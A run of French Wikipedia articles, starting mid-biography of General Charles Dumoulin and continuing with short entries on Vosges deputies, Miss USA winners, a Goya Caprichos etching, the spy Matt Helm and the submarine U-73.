Lors d'un interrogatoire judiciaire en l'an III de la République, Charles Dumoulin déclare qu'entre 1785 et 1792, soit de , il habite Paris « où il était professeur au Collège de Lisieux ». Cette assertion est exagérée, car il ne peut, en considération de son âge, qu'y être maître d'études ou répétiteur, ce qui est au demeurant, une place montrant sa bonne éducation. C'est vers cette époque qu'il compose poèmes et autres écrits.
À la suite de la déclaration de guerre en date du 20 avril 1792, par l'assemblée législative à l'empereur d'Autriche, les États européens hostiles à la Révolution forment une coalition. Les armées prussiennes et autrichiennes s'avancent en territoire français, précipitant un grand mouvement de conscription volontaire. Il s'engage en 1793 et commence sa carrière militaire comme lieutenant au de grenadiers de Paris, ce qui démontre qu'il a des relations dans le milieu jacobin.
Il part à l'armée du Nord participer au siège de Valenciennes. Le mai, après 15 jours à la , Charles Dumoulin est élu capitaine de la par le conseil d'administration de son bataillon. Le 28 juillet, la place forte est obligée de se rendre. Les honneurs de la guerre sont rendus à la garnison par les Anglais vainqueurs, mais 3 otages sont conservés parmi lesquels le capitaine Charles Dumoulin.
L'insurrection de Lyon.
Libéré en août, Dumoulin rejoint sa troupe au siège de Lyon, en état de révolte contre la République. Le 30 septembre 1793, le commandant Albert Desvignes, chef de bataillon des Grenadiers de Paris, est tué par des insurgés au pont Morand. Le lendemain , le capitaine Dumoulin est élu pour reprendre le commandement à 27 ans. Après un siège de plusieurs mois, la ville est prise le 9 octobre 1793. Une répression terrible est menée par Collot d'Herbois et Fouché et va durer plusieurs mois jusqu'au printemps 1794 et fera plusieurs milliers de victimes, fusillés, guillotinés ou mitraillés par canonade.
Chargé, après la fin du Soulèvement de Lyon contre la Convention nationale de reconstituer son bataillon entamé par les combats, il obtient l'autorisation de recruter. Il incorpore alors à son bataillon plusieurs centaines de jeunes lyonnais échappés du massacre mais qui ne peuvent justifier d'un brevet de civisme. Dans les premiers jours de l'année 1794, il conduit son bataillon ainsi reconstitué dans la vallée de la Maurienne où il prend ses cantonnements.
Dénoncé pour ces incorporations, il est traduit devant le Tribunal révolutionnaire. De cet épisode il raconte :
Campagne d'Italie et de Suisse.
Remis en activité sur un rapport de Merlin de Douai, Charles Dumoulin est réintégré dans Armée des Alpes le 4 octobre 1794, puis est suspendu et emprisonné, destitué et emprisonné à nouveau le 31 mars 1795, avant d'être finalement réintégré le 22 septembre 1795. Charles Dumoulin est alors affecté à l'état major de Guillaume Brune où il demande à participer à la campagne d'Italie. Bonaparte, nommé à la tête de cette nouvelle armée, appelle Dumoulin qui reprend sa place de commandant chef de bataillon et forme, avec la et la , la brigade Claude-Victor Perrin, de la division Pierre Augereau, avec son collègue chef de bataillon Louis-Gabriel Suchet.
Dumoulin participe à toutes les batailles importantes de la campagne d'Italie, notamment à la bataille du pont d'Arcole, Rivoli, Mantoue, puis après l'armistice et le traité de Leoben, il reste quelques mois à Padoue.
En 1798, il participe à la campagne de Suisse, où il se distingue à la tête de la . Il est nommé le 23 mars 1798, chef de brigade en remplacement de Suchet, devenu général, colonel du de hussards (la fameuse brigade infernale) puis aide de camp de Brune. Le 24 mars 1799, il est commandant provisoire du de chasseurs à cheval. La campagne d'Helvétie se termine par la transformation de la Suisse en République helvétique, alliée de la France.
Sans affectation, il est à Paris en septembre 1799, sans doute pour demander le commandement définitif du de chasseurs en remplacement du colonel Poichet, en position de départ à la retraite.
18 Brumaire.
Charles Dumoulin se trouve à Paris lors des évènements du coup d'État du 18 brumaire. Dans une lettre en date du 20 octobre 1801, au ministre de la guerre Berthier, il précise :
Ces faits ne sont pas exacts et cette lettre est écrite sous le coup de la colère contre son supérieur du moment, le général Victor Emmanuel Leclerc, beau-frère de Bonaparte, qui revendiquait avoir , avec Joachim Murat, l'autre beau-frère.
L'intervention de Dumoulin est probable lors de l'irruption dans la salle de l'Orangerie pour aller délivrer Lucien Bonaparte, aux prises avec les députés votant la mise « hors la loi», c'est-à-dire la mort, de Napoléon Bonaparte. 
Dans ses "Mémoires historiques sur Napoléon ", la duchesse Laure Junot d'Abrantès écrit que Napoléon Bonaparte, ayant appris que son frère Lucien était en danger au milieu des députés menaçants et armés, se serait tourné vers un officier qu'il connaissait bien, à quelques pas de lui, aide de camp du général Brune resté en Hollande, et lui aurait dit :
L'intervention de Dumoulin aux événements du coup d’État du 18 brumaire ne semble pas s'être limitée au sauvetage de Lucien dans la salle des Cinq-Cents en fin d'après midi. En effet le général Gaspard Gourgaud, écrivant à Sainte-Hélène sous la dictée de l'Empereur ses "Mémoires pour servir à l'histoire de France sous Napoléon ", mentionne le nom de (ce qui doit être considéré comme une erreur de dictée), juste avant la dispersion et en ces termes :
Les faits semblent confirmés par le fait que dans une lettre de décembre 1799, le général Berthier annonce à Dumoulin qu'il a été désigné pour recevoir un sabre d'honneur 
Chouannerie, Italie, Austerlitz.
Nommé Général de brigade le 6 janvier 1800, il est affecté à l'armée de l'Ouest sous les ordres de Gardanne où il se distingue lors de la bataille de Saint-James et de la bataille des Tombettes, contre les chouans en Ille-et-Vilaine et dans la Manche. Il participe ensuite à la deuxième campagne d'Italie. Il est muté à la division Gardanne, son ancien chef à l'armée de l'Ouest, et c'est à la tête d'une brigade d'infanterie qu'il prend part à la bataille de Marengo. La division Gardanne, attaquée par la principale colonne autrichienne bien supérieure en nombre, dispute le terrain contre les attaques ennemies et permet ainsi l'arrivée de la division Desaix, qui décide de la victoire. Envoyé en mission à Cadix en 1801, il passe à l'armée de Hanovre de 1803 à 1805.
Commandant la première brigade de la division Rivaud en août 1805, il arrive avec le corps de Bernadotte tout entier à Brno le 30 novembre et le lendemain, se réunit au gros de l'armée pour la bataille d'Austerlitz où son intervention et son maintien sur le plateau de Pratzen, face aux attaques du Régiment Préobrajensky de la garde russe, puis de trois escadrons des chevaliers-gardes sous les ordres du prince Repnine-Volkonski, qui viennent d'arriver d'Austerlitz, est décisive.
Mariage avec la comtesse von Eckart.
Le général Dumoulin arrive à Munich l'année suivante où il revoit lors d'un bal de la noblesse bavaroise la fille unique du baron von Eckart, ministre et ami du roi de Bavière, Catherine-Eugénie von Eckart, qu'il avait rencontrée un an auparavant lors de son passage à Francfort-sur-le-Main avec l'armée de Bernadotte. Il tombe amoureux de la jeune fille âgée de 21 ans et celle-ci « partage sa flamme » mais du fait de l'opposition des parents de la jeune femme à cette union, il organise la fugue de la jeune Eugénie ; le jeune couple se réfugie à Paris le 20 juin 1806, et s'installe à l'hôtel d'Angleterre.
Accusé par le père de la jeune fille d’enlèvement, une plainte est déposée contre lui ; lorsque Napoléon en est informé, il ordonne une double enquête à Fouché et à Berthier. Dans une missive de Napoléon à Berthier du 7 juillet 1806, il dit :
Arrestation.
Encore accusé par le père d'avoir contracté un premier mariage à Fech en Moravie le 5 janvier 1806, avec Victoire Kugler, Dumoulin est poursuivi pour bigamie. Lorsqu'il revient prendre son poste à Munich, il est mis aux arrêts par Berthier et rayé des cadres de l'armée le 20 septembre 1806. Après enquête du Grand Juge Claude Ambroise Régnier, son premier mariage se révèle inexistant au regard des lois françaises et il ne peut pas être accusé de bigamie, car il ne s'est pas marié avec la demoiselle von Eckart et celle-ci étant majeure, elle avait le droit de le suivre à Paris. Dumoulin échappe aux poursuites criminelles et fait déclarer que son mariage en Moravie est nul et non avenu comme n'ayant pas été transcrit sur les registres français. Le baron von Eckart donne son consentement au mariage de sa fille unique et le mariage a lieu, dans la chapelle électorale de Saxe, au château de Leipzig le 11 décembre 1806.
Réintégré dans son grade, Dumoulin part en Italie sous Eugène de Beauharnais en 1807, puis rejoint l'Espagne de 1808 à 1811. Présent à la campagne de Saxe en 1813, il se retire en Bavière après le désastre de Leipzig dans la propriété de sa femme au château de Bertholdsheim, à côté de la ville de Neubourg, au bord du Danube, et ne participe pas à la campagne de France.
Après la chute de l'Empire.
Absent aussi aux Cent-Jours, il peut, à la Seconde Restauration, s'en prévaloir auprès de Louis XVIII qui le fait baron le 12 février 1817. Commandant le département du Tarn en 1818, il est fait vicomte en 1821 et comte en 1822. Enfin Dumoulin obtient le commandement du département du Bas-Rhin le 3 septembre 1823. Grand Officier de la Légion d'honneur le 23 mai 1825, il est admis à la retraite le 18 juillet 1830 et meurt à Strasbourg le 17 octobre 1847.
Père de dix enfants, il laisse une nombreuse descendance tant en France qu'en Allemagne sous les noms de Du Moulin Eckart et von der Mühle Eckart, dont l'historien écrivain allemand Richard von der Mühle Eckart, spécialiste de Richard Wagner. Son unique fille, Aimée du Moulin, avait épousé un officier dauphinois, Joseph du Beylié dont le fils Léon de Beylié sera général et le principal donateur du musée de Grenoble.
L'un des fils du général, Jules Du Moulin, officier de chasseurs à Besançon, est le père biologique de Jules Ménétrier, qui prétendait être l'héritier du trône de France à la fin du .
Notes et références.
Notes

</doc>
<doc id="7279057" url="https://fr.wikipedia.org/wiki?curid=7279057" title="Donald Hamilton">
Donald Hamilton

Donald Hamilton, né le à Uppsala en Suède et mort le à Visby en Suède, est un écrivain américain de roman d'espionnage, de roman policier et de western.
Biographie.
Arrivé aux États-Unis à l'âge de huit ans avec son père, un comte suédois ayant renoncé à son titre quand il a émigré, Donald Hamilton est diplômé de l'université de Chicago en 1938. Il sert dans la marine pendant la Seconde Guerre mondiale.
Il commence une carrière d'écrivain en 1947 avec la publication d'un roman policier, "Date with Darkness". Il écrit également plusieurs westerns, dont "The Big Country", roman qui sera adapté au cinéma en 1958 par William Wyler sous le titre "Les Grands Espaces", avec Gregory Peck, Jean Simmons et Carroll Baker.
Devant le succès des romans de Ian Fleming avec James Bond, il abandonne le genre policier pour écrire des romans d’espionnage. En 1960, il crée le personnage de Matt Helm, agent des services secrets que l'on retrouve dans vingt-sept romans jusqu'en 1993. Deux des romans de la série, "The Retaliators" et "The Terrorizers", ont été nommés en 1977 et 1978 pour le prix Edgar-Allan-Poe du meilleur roman. Au cinéma, Matt Helm a été interprété à quatre reprises par Dean Martin et, dans la série télévisée "Matt Helm", c'est Anthony Franciosa qui incarne le rôle-titre.
Donald Hamilton passe les dernières années de sa vie dans son pays natal.

</doc>
<doc id="7279059" url="https://fr.wikipedia.org/wiki?curid=7279059" title="Rhamnès">
Rhamnès

Rhamnès ou Rhamnés dans l"'Énéide" est le nom de l'un des plus fidèles amis de Turnus, le roi des Rutules.
Histoire.
Le jeune Rhamnès est lui-même roi (bien que Virgile ne cite pas sa population) et un prêtre avec des compétences de divination : lorsque la guerre a éclaté entre Turnus et les Troyens dirigés par Enée, il porte les armes pour combattre aux côtés de son ami.
Turnus a choisi quatorze jeunes chefs de son armée pour assiéger le camp troyen, et parmi eux il y a aussi Rhamnès. Mais au cours de la première nuit du siège, les jeunes Troyens Nisus et Euryale attaquent le camp ennemi, et après avoir vu que les italiques sont tous endormis, tirent leurs épées. Nisus d'abord attaque Rhamnès, qui ronfle sur un haut tas de tapis. Le roi est égorgé, comme trois de ses serviteurs, couchés à ses pieds entre les armes : bien qu'il fût un devin, il n'avait pas prévu sa mort violente.
Euryale s'approche du cadavre de Rhamnés et le dépouille de ses précieuses phalères. Le meurtre du roi italique ne sera découvert qu'après la mort des deux jeunes Troyens.
La caractérisation de Rhamnès contient quelques éléments humoristiques : ce personnage aime la pompe, ruse fort et se révèle incapable prophète. Mais Virgile souligne aussi l'amitié sincère entre lui et Turnus, et le deuil que sa mort suscite. L'ironie est nettement plus forte vis-à-vis des serviteurs, trois imprudents adolescents emmêlés entre les armes : bien qu'en eux aussi soit reconnaissable la caractéristique de fidélité, dans ce cas envers Rhamnès, le maître, ainsi mis en évidence dans la traduction de J.N.M. de Guerle.
Le profond sommeil du roi italique devient presque proverbial dans la littérature ultérieure : une référence en ce sens est contenue dans l"Ibis" de Ovide, qui mentionne également un personnage homérique, c'est-à-dire le jeune seigneur thrace Rhésos, destiné à mourir dans des circonstances identiques. Curieusement, dans ce texte on dit que Rhamnès appartenait au peuple des Rutules.

</doc>
<doc id="7279060" url="https://fr.wikipedia.org/wiki?curid=7279060" title="D'oh-in In the Wind">
D'oh-in In the Wind



</doc>
<doc id="7279062" url="https://fr.wikipedia.org/wiki?curid=7279062" title="The Mexican Staring Frog of Southern Sri Lanka">
The Mexican Staring Frog of Southern Sri Lanka



</doc>
<doc id="7279064" url="https://fr.wikipedia.org/wiki?curid=7279064" title="Charles Hingray">
Charles Hingray

Charles Hingray est un homme politique français né le à Épinal (Vosges) et décédé le à Paris.
Biographie.
Libraire à Paris, il se rend célèbre avec le procès qui lui est intenté pour avoir refusé de payer le péage sur le pont des Arts. 
Il est député des Vosges de 1848 à 1849, siégeant à gauche.

</doc>
<doc id="7279071" url="https://fr.wikipedia.org/wiki?curid=7279071" title="Rallye RACE d'Espagne">
Rallye RACE d'Espagne

Le Rallye R.A.C.E. d'Espagne (ou Rally RACE, ou encore Rally Costa Blanca ou Rally Sol) était une compétition annuelle de rallye automobile espagnole sur asphalte, organisée par le "Royal Automobile Club d'Espagne" à Madrid.
Histoire.
Sa première édition, passant par Burgos, puis Valladolid, Salamanque, Ávila, Ségovie, Navacerrada et enfin Madrid, et se terminant alors par des épreuves de vitesse, d'accélération et de freinage, date de 1953, pour commémorer les 50 ans d'existence du R.A.C.E. (rassemblant alors une centaine de pilotes ibériques, ainsi que des motocyclistes tout spécialement envoyés par le "Real Moto Club de Cataluña"), avant même la création du championnat espagnol (tout comme le rally Costa Brava par exemple). La deuxième édition voit également l'apparition d'une course de côte à Bilbao, d'une épreuve de freinage à Santander, et de sections d'épreuves de régularité, avec une arrivée sur l'autodrome de Madrid.
Après 12 années d'existence, il est comptabilisé dans le Championnat d'Europe des rallyes, en 1965. Il le reste à 18 reprises jusqu'à sa disparition en 1986. En 1977 et 1978, la FIA le retient pour sa "Coupe des pilotes" (qui précède alors leur Championnat mondial officiel).
Il est monopolisé par les pilotes italiens durant la première moitié des années 1980 (dont le champion du monde 1988-89 Miki Biasion, par deux fois). Antonio Zanini l'a remporté à trois reprises. Seul Jean-Pierre Nicolas l'a également fait deux fois consécutivement.
Depuis 2009 est organisée annuellement une compétition commémorative "Historic", le "Rally de España Histórico" (grâce au "Club Deportivo Rally de España Histórico"). Elle est remportée par Carlos Sainz et Luis Moya sur Porsche 911 SC en 2012 et 2013 (ainsi que par son frère aîné Antonio -"Toño"- en 2010). Elle fait partie du calendrier du "Championnat d'Europe des rallyes sportifs historiques de la FIA" depuis les débuts de celui-ci en 2012 (sous la forme d'un "rallye de performance", ou "rallye de vélocité"), et du championnat d'Espagne des rallyes historiques depuis sa création.

</doc>
<doc id="7279072" url="https://fr.wikipedia.org/wiki?curid=7279072" title="Augustin Doublat">
Augustin Doublat

Augustin Doublat est un homme politique français né le à Épinal (Vosges) et décédé le à Brouvelieures (Vosges).
Fils de Christophe Doublat, député, il est maître de forges à Brouvelieures. Conseiller général en 1834, il est député des Vosges de 1834 à 1849, siégeant au centre sous la Monarchie de Juillet puis chez les républicains conservateurs sous la Deuxième République.

</doc>
<doc id="7279073" url="https://fr.wikipedia.org/wiki?curid=7279073" title="Le Conseil des dieux (film)">
Le Conseil des dieux (film)

Le Conseil des dieux (titre original : "") est un film dramatique est-allemand réalisé par Kurt Maetzig sorti en 1950.
Il est l'un des premiers films traitant explicitement de la complicité d'une entreprise allemande dans les crimes du nazisme. Il retrace le parcours d'IG Farben entre 1930 et 1947.
Le film s'appuie sur une documentation parue en 1947 et les pièces du procès de Nuremberg.
Synopsis.
Au centre de l'intrigue se trouvent le président d'une société secrète, Mauch - allusion à Carl Krauch, membre du directoire de supervision d'IG Farben et criminel de guerre - et un chimiste fictif, Dr. Scholz. Ils sont principalement responsables de la production des armements et de la production de gaz toxique d'IG Farben. La recherche du profit à tout prix les a amenés à prendre une part active dans les crimes du régime nazi. Scholz ferme les yeux afin de sauver son emploi et la famille jusqu'en 1948. Ce n'est qu'après l'utilisation d'un explosif interdit, quand il voit les dommages terribles qu'il provoque, qu'il se met à parler.

</doc>
<doc id="7279075" url="https://fr.wikipedia.org/wiki?curid=7279075" title="Le Signe du Bélier">
Le Signe du Bélier

Le Signe du Bélier (") est un film dramatique américain réalisé par John Sturges et sorti en 1948.
Synopsis.
Sherida Binyon entre comme secrétaire au service de Leah St. Aubyn, romancière devenue paralytique à la suite du sauvetage de ses deux enfants. Mais, de ce jour, elle les tient sous son joug et a décidé qu'ils ne se marieraient pas. Elle monte les jeunes gens contre Sherida.

</doc>
<doc id="7279078" url="https://fr.wikipedia.org/wiki?curid=7279078" title="François de Lyrot de La Patouillère">
François de Lyrot de La Patouillère



</doc>
<doc id="7279081" url="https://fr.wikipedia.org/wiki?curid=7279081" title="Kandace Krueger">
Kandace Krueger

Kandace Krueger (née le à Austin, Texas, aux États-Unis) est une animatrice de télévision et journaliste américaine, élue Miss USA 2001. Elle est la fille de Larry et Barbara Johnson Krueger. Elle a une sœur nommée Katrina.
Concours.
Miss Texas USA.
Krueger débute dans la compétition aux concours locaux de Miss Texas USA lorsqu'elle est âgée de 18 ans, et se classe cinquième sans avoir remporté de titre. Elle remporte son premier titre local au comté de Williamson USA, en 1999 et son second titre, Miss Austin USA, en 2000. Krueger concourt de nombreuses fois à Miss Texas USA dans les années 1990 sans remporter de prix particulier. En 2000, en tant que demi-finaiste, Krueger remporte le titre de Miss Texas USA en 2001.
Miss USA.
Krueger représente le Texas au concours de Miss USA 2001 retransmis en direct de Gary (Indiana) en . Elle devient la première texane demi-finaliste du top dix durant deux ans, classée à la seconde place du concours en maillot de bain (9.38), notamment. Pendant son règne de miss, elle soutient les recherches dans la lutte contre le cancer du sein. De retour au Texas, les clés de la ville d'Austin lui sont confiées, présentées par le sénat, et fait la rencontre du gouverneur Rick Perry.
Miss Univers.
En tant que Miss USA, Krueger obtient le droit de représenter les États-Unis au concours de Miss Universe 2001 à Bayamón (Porto-Rico), dans lequel elle se place seconde dauphine, derrière les finalistes Denise Quiñones de Porto Rico et Evelina Papantoniou de Grèce.

</doc>
<doc id="7279085" url="https://fr.wikipedia.org/wiki?curid=7279085" title="Joseph Falatieu">
Joseph Falatieu

Joseph Jules Falatieu est un homme politique français né le à Bains-les-Bains (Vosges) et mort le à Pont-du-Bois (Haute-Saône).
Biographie.
Maître de forges, il est conseiller d'arrondissement puis conseiller général du canton de Bains-les-Bains de 1846 à 1871 et député des Vosges de 1848 à 1849, soutenant le général Cavaignac. Il est un des nombreux membres de la famille Heudelet de Bierre et ses alliances industrielles dans les forges et filatures dans la Haute-Saône et dans les Vosges.
Il est fait Chevalier de la Légion d'Honneur par décret du . Curieusement, son dossier à la Chancellerie porte la graphie fautive de "Jules Falatien manufacturier".

</doc>
<doc id="7279090" url="https://fr.wikipedia.org/wiki?curid=7279090" title="Marijve Jansen">
Marijve Jansen



</doc>
<doc id="7279093" url="https://fr.wikipedia.org/wiki?curid=7279093" title="Victor Résal">
Victor Résal

Victor Bernard Résal est un homme politique français, né le à Remiremont (Vosges) et mort le à Dompaire (Vosges).
Biographie.
Avocat, il est maire de Dompaire et conseiller général du canton de Dompaire. Il est député des Vosges de 1849 à 1851, siégeant avec la droite orléaniste. Par la suite, il devient président du Conseil général des Vosges.
Il a été nommé Chevalier de la Légion d'honneur par décret du et officier d'Académie.

</doc>
<doc id="7279095" url="https://fr.wikipedia.org/wiki?curid=7279095" title="Lupane">
Lupane

Le lupane est un hydrocarbure de formule brute . Il s'agit d'un triterpène pentacyclique isomère de l'hopane dont les dérivés, tels que le lupéol, sont présents en abondance notamment dans les fruits et légumes.

</doc>
<doc id="7279098" url="https://fr.wikipedia.org/wiki?curid=7279098" title="I Want Candy">
I Want Candy

 est une expression anglaise signifiant « Je veux des bonbons » et peut faire référence à :

</doc>
<doc id="7279099" url="https://fr.wikipedia.org/wiki?curid=7279099" title="Émile Perreau">
Émile Perreau

Émile Perreau est un homme politique français né le à Épinal (Vosges) et décédé le à Paris.
Avocat à Remiremont en 1820, il est conseiller d'arrondissement et maire de Remiremont de 1841 à 1848. il est député des Vosges de 1849 à 1850, siégeant à droite, avec les monarchistes.

</doc>
<doc id="7279101" url="https://fr.wikipedia.org/wiki?curid=7279101" title="Lynnette Cole">
Lynnette Cole

Lynnette Cole-O'Nan (née le à Columbia dans le Tennessee) est une animatrice de télévision et mannequin américaine élue Miss USA en 2000. Elle est âgée de 21 ans la première fois qu'elle remporte la couronne nationale.
Biographie.
Cole possède des origines portoricaines. À l'âge de dix ans, elle est placée en foyer d'accueil avec son frère aîné avant d'être adoptée par Gail et Larry Cole, un couple parents adoptifs déjà de plusieurs enfants d'ethnies différentes.
Concours.
Cole participe à son tout premier concours en 1995 et remporte le titre de Miss Tennessee Teen USA. Elle est classée comme l'une des six finalistes au concours de Miss Teen USA cette même année, et remporte le titre de Miss Photogenic. Cole remporte plus tard en 1997 le titre de Miss Teen All American.
À la suite de ses titres de Miss Tennessee USA et Miss USA 2000, Cole devient candidate au concours de Miss Universe, tenu à Nicosie, à Chypre plus tard cette même année. Sa performance lui permet de devenir l'une des cinq finalistes. En tant que Miss USA, Cole est représentante de la Miss Universe Organization.
Après avoir remporté le titre de Miss USA, Cole devient présentatrice de télévision sur les chaînes NBC, CMT, ESPN, MTV, VH-1 et apparaît de temps à autre dans le programme "As the World Turns". Elle est également apparue dans plusieurs publicités. Cole épouse Michael O'Nan de Tampa, et participe au marché de l'import/export.

</doc>
<doc id="7279105" url="https://fr.wikipedia.org/wiki?curid=7279105" title="El sí pronuncian y la mano alargan al primero que llega">
El sí pronuncian y la mano alargan al primero que llega

L'eau-forte ("Elles prononcent le oui et tendent la main au premier qui se présente") est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro deux dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
Selon Helman, le titre de ce caprice est tiré de vers de Jovellanos (les satires "A Arnesto"), où le poète critique Alcinda parce que contre la raison et son propre sentiment, elle se laisse lier par les liens du mariage comme les bœufs au joug :
Cuántas, oh Alcinda, a la coyunta uncidas,&lt;br&gt;¡Tu suerte envidian! Cuántas de himeneo&lt;br&gt;Buscan el yugo por lograr su suerte,&lt;br&gt;Y sin que invoquen la razón, ni pese&lt;br&gt;Su corazón los méritos del novio,&lt;br&gt;El sí pronuncian y la mano alargan&lt;br&gt;Al primero que llega! Qué de males&lt;br&gt;esta maldita ceguedad no aborta!&lt;br&gt;Veo apagadas las nupciales teas&lt;br&gt;Por la discordia con infame soplo&lt;br&gt;Al pie del altar, y en el tumultoBrindis y vivas de la tornaboda,&lt;br&gt;Una indiscreta lágrima predice&lt;br&gt;Guerras y oprobios a los mal unidos.&lt;br&gt;Veo por mano temeraria roto&lt;br&gt;El velo conyugal, y que corriendo&lt;br&gt;Con la imprudente frente levantada,&lt;br&gt;Va el adulterio de una casa a otra. 
La jeune tend sa main gauche à son époux et cache la droite. Elle porte un masque noir et il se combine dans sa chevelure avec un autre porté à la manière d'un peigne et qui représente une tête de rate ou de chienne. Le masque, comme dans d'autres estampes de Goya, sert non pour camoufler, mais plutôt pour dévoiler et révéler le véritable caractère de la personne qui le porte. C'est la luxure qui pousse cette femme vers le mariage. Mais la tromperie est partagée, car l'homme avec un regard oblique et intéressé semble bien plus penser au profit qu'il va tirer de ce mariage. Le désordre de la foule correspond à la discorde et au tumulte au pied de l'autel dont parlent les vers. La vieille courbée sur le bâton sera l'instrument de l'adultère dont les vers font allusion.
On retrouve ce même thème, celui du mariage de convenance, se retrouve dans les images 14, "Que sacrificio!" ; 57, "La filiación" et 75, "¿No hay quién nos desate?".
Technique de la gravure.
L'estampe mesure sur une feuille de papier de . Dans l'angle supérieur droit : « P.2. ».
Le dessin est extraordinaire, avec trois plans de lumière qui correspondent à trois intensités expressives. Les rayures dans les vêtements arrivent à imiter les effets du velours, des soieries ou des fourrures.
La gravure utilise l'eau-forte et l'aquatinte. La planche se trouve dans un bon état de conservation mais avec l'aquatinte affaiblie.

</doc>
<doc id="7279114" url="https://fr.wikipedia.org/wiki?curid=7279114" title="Matt Helm (personnage de fiction)">
Matt Helm (personnage de fiction)

Matt Helm est un agent secret de fiction créé par Donald Hamilton dans une série de vingt-sept romans.
Biographie fictive.
Ce héros de taille imposante, mesurant plus de , est né au Minnesota et a été élevé dans le Sud-Ouest américain. Volontaire dans l'armée au début de la Seconde Guerre mondiale, il attire l'attention de ses supérieurs par ses qualités de sang-froid et d'intelligence. Recruté pour devenir espion, il est chargé de missions secrètes derrière les lignes de l'ennemi. Aux derniers jours de la guerre, il se trouve mêlé à de périlleuses aventures et doit être hospitalisé pendant plusieurs semaines. C'est là qu'il rencontre la jeune et jolie Beth, l'amour de sa vie, et qu'il décide d'abandonner le monde de l'espionnage. 
Démobilisé, il se marie, s'installe au Nouveau-Mexique avec son épouse, dont il a trois enfants, et devient écrivain de romans westerns et photographe. Pendant quinze ans, son existence tranquille ne connaît aucun remous jusqu'à ce que son passé surgisse à nouveau pour venir compromettre son avenir. Discrètement sollicité par ses anciens collègues pour reprendre du service, il refuse, jusqu'au jour où l'enlèvement de sa fille par des agents russes, dans le premier titre de ses aventures, "Le Signal de détresse" (1960), le pousse à sortir de sa réserve. C'en est fait de sa quiétude. Cette réintégration entraîne son divorce, et Beth se remarie avec l'Anglais Logan, installé dans un ranch à Reno.
Patriote et fier de l'être, Matt Helm, un pur produit de la Guerre froide, devient un dur, cynique et violent, prêt à tuer si on lui en donne l'ordre ou si la situation et les intérêts supérieurs de la nation le nécessitent. C'est d'ailleurs un tireur d'élite qui manie le revolver aussi bien que la carabine, avec un faible pour les armes de longue portée. Il n'est d'ailleurs jamais avare de commentaires techniques sur les armes qu'il utilise, ce qui souligne les connaissances de son créateur en matière d'armurerie. Infatigable, il se lance dans des missions dans le monde entier. 
Dans "Perds pas le nord !" (1960), il se fait passer pour un simple photographe en voyage en Suède pour découvrir sur place les causes de la disparition de plusieurs agents occidentaux. Dans "Les Bousilleurs" (1961), il est mêlé à un trafic de drogues où sont impliqués un agent soviétique et le mari de son ancienne épouse. Dans la mission suivante, "Quai des Bons-Enfants" (1962), il se fait gangster, une couverture idéale, pour infiltrer un réseau qui détient et entend livrer aux Russes l'inventeur d'un appareil permettant la détection aérienne de navires sous-marins. Dans "Matt Helm décontracté" (1962), il doit contrecarrer les projets d'un groupe malveillant, basé au Mexique, qui veut détourner un missile sol-sol américain. Envoyé au Costa Rica, dans "Les Traqueurs" (1963), il a pour but d'éliminer un ancien chef nazi et se trouve épauler dans sa poursuite, qui se termine au Mexique, par une jolie femme, qui se révèle une espionne russe. Il prend l'identité d'un détective privé dans "Les Ravageurs" (1964), afin de localiser l'endroit où les Soviétiques ont dissimulé un sous-marin ultra-sophistiqué. Dans "Matt et la Mort noire" (1965), sous couvert d'un faux voyage de noces en Écosse, il doit mettre la main sur un biologiste travaillant pour la Chine communiste et qui a mis au point une dangereuse souche de peste bubonique. En vacances à Hawaï, dans "Matt Helm sans guitare" (1966), il tombe amoureux, tout en réussissant à contrecarrer les plans d'espions chinois qui cherchent à établir leur réseau dans l'archipel. C'est à Los Angeles que s'amorce "Tu nous empoisonnes" (1971), où la mafia est de mèche avec les Chinois pour importer une cargaison de drogue et un nouveau générateur à catalyse qui pourrait transformer la pollution atmosphérique en poison mortel.
Filmographie.
Cinéma.
Le rôle de Matt Helm est interprété par Dean Martin.
Série télévisée.
Le rôle de Matt Helm est interprété par Anthony Franciosa.

</doc>
<doc id="7279115" url="https://fr.wikipedia.org/wiki?curid=7279115" title="Unterseeboot 73 (1940)">
Unterseeboot 73 (1940)

L'Unterseeboot 73 ou U-73 est un sous-marin allemand (U-Boot) de type VII.B construit pour la Kriegsmarine pendant la Seconde Guerre mondiale.
Construction.
L'U-73 fait partie du programme 1937-1938 pour une nouvelle classe de sous-marins océaniques. Il est de type VII B lancé entre 1936 et 1940. Construit dans les chantiers de Bremer Vulkan-Vegesacker Werft à Brême, la quille du U-73 est posée le et il est lancé le . L'U-73 entre en service deux mois plus tard.
Historique.
Mis en service le , l'U-73 est utilisé comme sous-marin d'entrainement (bateau-école) au sein de la 7. Unterseebootsflottille à Kiel.&lt;br&gt;
Le , l'U-73 devient opérationnel toujours dans la 7. Unterseebootsflottille, à Kiel, puis à la base sous-marine de Saint-Nazaire en France.
Il réalise sa première patrouille de guerre, quittant le port d'Heligoland, le , sous les ordres du Kapitänleutnant "Helmut Rosenbau". Il rejoint la base sous-marine de Lorient le au terme de vingt-trois jours de croisière et après avoir coulé un navire marchand de tonneaux.
L'Unterseeboot 73 a effectué quinze patrouilles ; il a coulé huit navires marchands pour un total de tonneaux, quatre navires de guerre pour un total de et a endommagé trois navires marchands pour un total de tonneaux, passant un total de 387 jours en mer.
Sa quinzième patrouille commence le , du port de Toulon, sous les ordres de l'Oberleutnant zur See "Horst Deckert". Après avoir endommagé le un navire marchand de tonneaux du convoi "GUS 24" en Méditerranée au nord-ouest d'Oran, l'U-73 est repéré par le destroyer américain "USS Woolsey", l'un des bâtiments d'escorte du convoi. Il est coulé par des charges de profondeurs ainsi que par des coups de canon des destroyers "USS Woolsey" et "USS Trippe", à la position géographique de . 
L'attaque coûte la vie de seize des cinquante membres d'équipage.
Patrouilles.
Opérations Wolfpack.
L'U-73 a opéré avec les "Wolfpacks" (meutes de loup) durant sa carrière opérationnelle:
Navires coulés.
L'Unterseeboot 73 a coulé 8 navires marchands pour un total de tonneaux, 4 navires de guerre pour un total de , et a endommagé 3 navires marchands pour un total de tonneaux au cours des 15 patrouilles (387 jours en mer) qu'il effectua.

</doc>
<doc id="7279116" url="https://fr.wikipedia.org/wiki?curid=7279116" title="Rhamnés">
Rhamnés



